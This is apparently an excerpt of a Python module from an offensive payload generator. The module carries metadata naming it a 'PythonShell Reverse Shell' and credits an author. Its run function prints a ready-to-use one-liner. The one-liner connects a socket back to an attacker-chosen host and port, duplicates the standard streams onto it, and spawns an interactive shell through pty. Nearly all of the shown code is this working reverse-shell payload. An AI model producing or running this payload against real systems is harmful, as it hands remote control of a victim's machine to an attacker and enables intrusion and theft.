...
metadata = {
    "name": "PythonShell Reverse Shell",
    "description": "A Python-based reverse shell that creates a socket connection and spawns a shell using the pty module.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
...
def run(args):
    ...
    python_script = f"""export RHOST="{lhost}";export RPORT={lport};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
    print(python_script)
